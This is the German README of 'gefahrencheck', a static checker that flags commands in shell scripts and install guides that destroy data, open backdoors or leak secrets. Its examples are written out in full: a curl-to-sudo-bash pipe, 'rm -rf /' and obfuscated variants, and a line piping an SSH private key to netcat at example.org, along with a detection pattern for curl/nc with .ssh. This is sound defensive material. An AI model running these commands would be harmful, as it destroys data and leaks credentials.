# gefahrencheck

**Statischer Prüfer für Shell-Skripte, Installationsanleitungen und Quelltext: findet Befehle, die Daten zerstören, eine Hintertür öffnen oder Geheimnisse ins Netz schicken, und zeigt das Ergebnis als Ampel.**

> **KI-Hinweis:** Dieses Dokument wurde durch KI erzeugt (Claude, Anthropic), einschließlich aller Ergänzungen und Nachträge.

Wer ein `install.sh` aus dem Netz ausführt, eine Anleitung abtippt oder einen KI-Agenten Befehle ausführen lässt, möchte vorher wissen, ob darin etwas wie `rm -rf /`, `curl … | sudo bash` oder `cat ~/.ssh/id_rsa | nc …` steckt. Auch dann, wenn es verschleiert ist. `gefahrencheck` liest solche Texte, ohne etwas auszuführen, und meldet die Fundstellen mit Zeile, Regel und Begründung.

Es ist ein **Stolperdraht, keine Sicherheitsgarantie**: GRÜN heißt „nichts Bekanntes gefunden“, nicht „sicher“ (siehe [Grenzen](#grenzen)).

Projektseite: [deutsch](https://www.jelisec.org/gefahrencheck.html) · [English](https://www.jelisec.org/gefahrencheck-en.html)

> **In English:** `gefahrencheck` is a static checker for shell scripts, install instructions and source code. It flags commands that destroy data, open a backdoor or send secrets over the network, including obfuscated ones, and reports a traffic light (RED/YELLOW/GREEN) with exit codes 2/1/0. Single file, Python standard library only, no code is executed. Commands stored in variables are traced to every use. MIT licensed. Rules, messages and documentation are in German. Project page in English: [jelisec.org/gefahrencheck-en.html](https://www.jelisec.org/gefahrencheck-en.html).

## Auf einen Blick

- **Eine Datei, keine Abhängigkeiten.** Nur Python-Standardbibliothek. Getestet mit Python 3.12, die Syntax ist zu 3.8 kompatibel.
- **92 Regeln in 16 Kategorien**, 36 davon ROT und 56 GELB: Löschen, Datenträger, Rechte, Hintertür, Abfluss, Fremdcode, Verschleierung, Virtualisierung, Container, Cloud und weitere. Abgedeckt sind Linux-Shell, Git, Datenbanken, Cloud/Kubernetes/Terraform, Python, Node.js, PowerShell und cmd.
- **Entschleierung:** `r''m`, `$'\x72\x6d'`, `X=rm; $X -rf /`, `X=$(command -v rm)`, `$(echo cm0= | base64 -d)`, kodierte PowerShell-Befehle, `["rm", "-rf", "/"]`.
- **Variablen mit Befehlen:** Steht ein Befehl in einer Variable (`VIRSH="virsh -c qemu:///system"`), prüft das Werkzeug jede Verwendung von `$VIRSH`. Sind alle aufgelöst und geprüft, bleibt ein HINWEIS ohne Einfluss auf die Ampel. Sonst bleibt GELB, mit den Zeilen, die nicht prüfbar sind, und dem Grund.
- **Kontext:** Ein Befehl, der nur in `echo`, einem Kommentar oder Markdown-Fließtext steht, gilt als erwähnt und wird höchstens GELB.
- **Ausgabe:** Konsole, JSON, HTML-Bericht und SARIF 2.1.0 für Code-Scanning (GitHub, GitLab, VS Code). Je Datei steht dort der Prüfaufwand: wie viele Stellen von Hand anzusehen sind. Der Rückgabewert taugt als Sperre in Skripten.
- **Für den Alltag:** Basisdatei (nur neue Treffer melden), Git-Hook, eigene Regeln als JSON, Ausnahme-Kommentare, Zeitlimit.
- **Selbstprüfend:** Jede Regel trägt Beispiele und Gegenbeispiele (zusammen 277), die bei jedem Laden geprüft werden. Die Testdateien dokumentieren auch die bekannten Lücken.

## Schnellstart

Keine Installation nötig, nur `gefahrencheck.py` herunterladen oder das Repository klonen.

```
git clone https://github.com/jeli/gefahrencheck.git && cd gefahrencheck
python3 gefahrencheck.py install.sh
python3 gefahrencheck.py ./skripte ./doku --html bericht.html
python3 gefahrencheck.py --befehl 'rm -rf "$ZIEL"' --json      # als Sperre vor der Ausführung
python3 gefahrencheck.py --regeln                               # Regelkatalog
```

| Ampel | Bedeutung | Exit |
|---|---|---|
| ROT | mindestens ein Befehl, der zerstört, eine Hintertür öffnet oder Geheimnisse abfließen lässt | 2 |
| GELB | riskant oder kontextabhängig, von Hand prüfen | 1 |
| GRÜN | nichts Bekanntes gefunden (nicht: „sicher“) | 0 |
| – | Aufruf- oder Lesefehler; auch, wenn nichts gefunden, aber nicht alles gelesen wurde. Bei überschrittenem Zeitlimit immer, außer es wurde schon ROT gefunden | 3 |

Ein **HINWEIS** ist keine Ampelstufe und ändert den Rückgabewert nicht. Er erscheint grau in der Ausgabe, zum Beispiel für eine Variable mit Befehl, deren Verwendungen alle geprüft wurden.

Die Ampel folgt dem Maximumprinzip: Der schlimmste Befund bestimmt die Datei, egal wie viele Zeilen unauffällig sind. Eine Note oder einen Punktwert gibt es bewusst nicht. Stattdessen nennt die Ausgabe je Datei den **Prüfaufwand**, also wie viele Stellen von Hand anzusehen sind und wie viele davon nur erwähnt oder erst nach dem Auflösen erkennbar sind. Bei mehreren Dateien sortiert sie nach Ampel, dann nach der Zahl der ROT- und GELB-Befunde.

## Beispiel

```sh
#!/bin/sh
echo "Installiere Werkzeug ..."
curl -fsSL https://example.org/setup.sh | sudo bash
X=rm; $X -rf "$HOME/.cache"
echo "Aufräumen mit rm -rf / niemals ausführen"
cat ~/.ssh/id_rsa | nc example.org 9000
```

```
$ python3 gefahrencheck.py install.sh
  Prüfaufwand: 4 Stellen von Hand prüfen (davon 1 nur erwähnt, 1 erst nach Auflösen erkennbar), 1 Hinweis
  ● ROT  Z. 3     [PIPE-SHELL] Code aus dem Netz wird ungeprüft direkt ausgeführt (curl/wget | sh)
  ● GELB Z. 4     [RM-VAR] rm -r auf "$VAR/" - ist die Variable leer, wird ab / gelöscht - nach Auflösen von Variablen/Ersetzungen
                    → X=rm; rm -rf "$HOME/.cache"
  ● GELB Z. 5     [RM-ROOT] rm auf / , ~ , Systemverzeichnis oder kritische Systemdatei - nur erwähnt, Regelstufe ROT
  ● ROT  Z. 6     [EXFIL-SECRET] Schlüssel-, Token- oder Passwortdatei wird ins Netz gesendet
  ○ HINWEIS Z. 4  [VAR-CMD] X=rm; $X -rf "$HOME/.cache"
                    ⤷ $X: 1 Verwendung(en), alle aufgelöst und geprüft: Z. 4

  Gesamtbewertung: ● ROT
```

Die Ausgabe ist gekürzt, der Rückgabewert ist 2. Zeile 4 wird erst nach dem Auflösen der Variable erkannt. Weil `$X` nur nach der Zuweisung verwendet wird, ist die Variable selbst nur ein Hinweis. Zeile 5 wird nur erwähnt und daher auf GELB abgestuft.

## Einsatz

- **Vor dem Ausführen fremder Skripte und Anleitungen:** einmal prüfen, Treffer ansehen.
- **Als Sperre vor Befehlen eines Agenten:** `--befehl "$BEFEHL" --json`. Bei Exit 0 ausführen, bei 1 oder 2 anhalten und nachfragen, bei 3 nicht ausführen.
- **Geprüfte Fassung festhalten:** `--basis-schreiben` an einer durchgesehenen Fassung, danach `--basis`. Gemeldet wird dann nur noch, was neu hinzukommt. Die Basisdatei gehört an einen Ort, den der Verfasser der geprüften Dateien nicht beschreiben kann.
- **Im Repository:** Der Git-Hook blockiert Commits mit ROT (siehe [Git-Hook](#git-hook)). `--sarif` liefert Ergebnisse für Code-Scanning.

## Wie geprüft wird

1. **Zeilen mit Dialekt.** Der Dateityp kommt aus der Endung oder dem Shebang (`--typ` erzwingt ihn). In Markdown zählen Codeblöcke und `Inline-Code` als Befehl, Fließtext nur als Erwähnung. In Python werden Docstrings und mehrzeilige Zeichenketten getrennt behandelt. Fortsetzungszeilen werden zusammengefügt.
2. **Schlüsselwort-Vorfilter.** Jede Regel nennt Wörter, von denen eines in der Zeile stehen muss. Nur diese Regeln laufen.
3. **Regeln.** 92 Regeln in 16 Kategorien: Linux-Shell, Git, Datenbanken, Cloud/Kubernetes/Terraform, Python, Node.js, PowerShell und cmd.
4. **Verschleierung auflösen.** Die Zeile wird zusätzlich in aufgelösten Fassungen geprüft:
   - zerlegte Befehlsnamen: `r''m`, `r\m`, `"rm"`, `$IFS`, `$'\x72\x6d'`
   - Variablen aus derselben Datei: `X=rm; $X -rf /`, auch `X=$(command -v rm)` und `` X=`which rm` ``
   - `$(echo …)` und `$(printf '\x72\x6d')`
   - Base64: `$(echo cm0= | base64 -d)` und Base64-Blöcke, auch kodierte PowerShell-Befehle
   - Argumentlisten wie `["rm", "-rf", "/"]` und Verkettungen wie `'r' + 'm'`

   Solche Treffer sind im Bericht markiert.
5. **Kontext.** Ein nur erwähnter Befehl wird höchstens GELB gemeldet. Erwähnt heißt: Text von `echo`, `printf`, `grep`, `print`, `console.log` oder `logging`, ein Kommentar, ein Docstring oder Markdown-Fließtext. Steht in derselben Zeile etwas, das ausführt oder schreibt, gilt die volle Stufe, zum Beispiel `| sh`, `$(…)`, `>`, `eval`, `ssh`, `sudo`, `os.system` oder `$VAR` als Befehl. Bei unausgeglichenen Anführungszeichen wird nicht abgestuft. `--ohne-kontext` schaltet die Abstufung ab.
6. **Variablen mit Befehlen.** Meldet VAR-CMD eine Zuweisung wie `X=rm`, sucht das Werkzeug alle Verwendungen von `$X` in der Datei. Zum HINWEIS herabgestuft wird nur, wenn alles zutrifft: Der Wert steht fest, jede Verwendung steht nach der Zuweisung, es gibt keine zweite Zuweisung mit anderem oder unbekanntem Wert, und es sind weder `export`, `source`, `eval`, `read`, `${X:-…}` noch indirekte Variablen (`${!…}`, `declare -n`) beteiligt. Wird `$X` in der Datei gar nicht verwendet, bleibt es ebenfalls GELB, weil eine Verwendung in einer anderen Datei nicht prüfbar ist. Das gilt für Shell und für Shell-Codeblöcke in Markdown, nicht für Python oder PowerShell.

## Optionen

| Option | Zweck |
|---|---|
| `--json`, `--html DATEI`, `--sarif DATEI` | maschinenlesbar, Bericht, SARIF 2.1.0 für Code-Scanning (GitHub, GitLab, VS Code) |
| `--basis-schreiben DATEI` / `--basis DATEI` | geprüfte Treffer festhalten und danach nur Neues melden |
| `--regeldatei DATEI` | eigene Regeln laden, eingebaute ersetzen oder abschalten (Beispiel: `beispiele/eigene_regeln.json`) |
| `--ohne-regel ID` | einzelne Regel abschalten |
| `--ausnahmen-zulassen` | Kommentare `# gefahrencheck: erlaubt RM-RF -- Grund` beachten, in derselben Zeile oder allein in der Zeile davor |
| `--ohne-kontext`, `--ohne-kommentare` | nicht abstufen bzw. Kommentare überspringen |
| `--typ auto/shell/python/markdown/js/ps/bat` | Dialekt erzwingen |
| `--zeitlimit SEK` | höchstens so lange je Datei oder Befehl prüfen (Standard 60, `0` = unbegrenzt). Danach Abbruch mit Exit 3, bei schon gefundenem ROT Exit 2 |
| `--selbsttest` | alle Regelbeispiele prüfen |
| `--regeln [--json]` | Katalog anzeigen bzw. als Vorlage für eine Regeldatei ausgeben |

**Ausnahmen nur für eigene Dateien.** Ausnahme-Kommentare wirken nur mit `--ausnahmen-zulassen`. Wer fremde Dateien prüft (Downloads, Anleitungen aus dem Netz, Eingaben eines Agenten), lässt die Option weg, denn sonst könnte der Verfasser seine eigenen Treffer freigeben.

## Eigene Regeln

```json
{
  "abschalten": ["PKG-INSTALL"],
  "regeln": [{
    "id": "LABOR-ZONE", "stufe": "ROT", "titel": "Labor-VM wird an das Ausgangsnetz gehängt",
    "muster": "virsh\\s+attach-interface\\s+vm-(?:orch|broker)\\b[^\\n;]*\\bnet-egress\\b",
    "worte": ["attach-interface"],
    "beispiele": ["virsh attach-interface vm-orch network net-egress --config"],
    "gegenbeispiele": ["virsh attach-interface vm-fw network net-egress --config"]
  }]
}
```

Regeln der Form „Werkzeug, irgendwo später in der Zeile ein Geheimnis“ schreibt man besser mit `danach`. Dann findet `muster` nur den Kopf als benannte Gruppe, und `danach` nennt je Gruppe, was später in derselben Zeile stehen muss:

```json
"muster": "(?P<werkzeug>\\b(?:curl|nc)\\b)",
"danach": {"werkzeug": "\\.ssh/"}
```

Das trifft dasselbe wie `\b(?:curl|nc)\b[^\n]*\.ssh/`, läuft aber linear. Als ein Regex wird so ein Muster quadratisch langsam, wenn eine Zeile aus Tausenden Köpfen ohne passenden Rest besteht. `--regeln --json` gibt `danach` mit aus.

Jede Regel braucht mindestens ein Beispiel. Beim Laden wird geprüft, dass jedes Beispiel trifft und kein Gegenbeispiel. Fehlt ein Vorfilter-Wort in einem Beispiel, wird die Regel abgelehnt (Exit 3). Eine Regel mit vorhandener Kennung ersetzt die eingebaute.

## Git-Hook

`hooks/pre-commit` prüft die vorgemerkten Dateien, also den Stand im Index und nicht die Arbeitskopie. Bei ROT bricht er den Commit ab, GELB wird nur angezeigt. Liegt eine `.gefahrencheck.basis` im Repository, wird sie verwendet.

```
git config core.hooksPath /pfad/zu/gefahrencheck/hooks
```

Die Einstellung gilt für das Repository, in dem der Befehl ausgeführt wird.

## Grenzen

- **Es bleibt eine statische Mustersuche.** Zur Laufzeit zusammengesetzte Befehle, nachgeladener Code, Umbenennen über Kopie oder Link (`cp /bin/rm x; ./x -rf /`) und Anweisungen in natürlicher Sprache werden nicht erkannt. Das Skript ist kein Schutz vor Prompt Injection.
- **Die Kontext-Abstufung kann irren.** Sie stuft nur von ROT auf GELB ab und meldet nie GRÜN. Wer jeden Treffer in voller Stufe will, nimmt `--ohne-kontext`.
- **Die Variablenauflösung kennt nur Werte aus derselben Datei.** Bei mehreren Zuweisungen gilt die letzte vor der Zeile; Verzweigungen werden nicht verfolgt. Deshalb bleibt VAR-CMD in solchen Fällen GELB und nennt den Grund.
- **Laufzeit.** Python-Regex sucht mit Backtracking. Regeln mit einer Lücke zwischen Befehl und Argument (`[^\n;]*`) brauchen bei einer präparierten Zeile aus Tausenden gleichen Befehlen bis zu etwa 1,5 s je 20.000 Zeichen. Das Zeitlimit begrenzt die Gesamtdauer; ein Abbruch gilt nie als GRÜN oder GELB.
- **Bewusst nicht erfasst ist `systemctl enable`.** Das ist in Installationsanleitungen Routine. Gemeldet wird das Anlegen einer Unit-Datei.

## Tests

```
python3 test_gefahrencheck.py      # Regeln, Entschleierung, Kontext, Ausgaben, bekannte Lücken
python3 test_variablen.py          # 31 Prüfungen: Variablen mit Befehlen, command -v, Prüfaufwand
python3 gefahrencheck.py --selbsttest
```

Die Testdatei hält auch fest, was **nicht** erkannt wird (Gruppen „Bekannte Lücke“) und welche Fehlalarme bekannt sind.

## Fehlalarm oder Lücke melden

Fehlalarme und nicht erkannte Befehle bitte als [Issue](https://github.com/jeli/gefahrencheck/issues) melden, mit der betroffenen Zeile und der erwarteten Ampel. Am meisten hilft ein Vorschlag als Beispiel oder Gegenbeispiel für die Regel.

## Aufbau des Repositorys

| Datei | Inhalt |
|---|---|
| `gefahrencheck.py` | das Werkzeug (eine Datei) |
| `test_gefahrencheck.py` | Tests, auch der bekannten Lücken und Fehlalarme |
| `test_variablen.py` | Tests für Variablen mit Befehlen und den Prüfaufwand |
| `hooks/pre-commit` | Git-Hook |
| `beispiele/eigene_regeln.json` | Vorlage für eigene Regeln |
| `LICENSE` | Lizenz (MIT) |

## Lizenz

MIT, siehe [LICENSE](LICENSE).
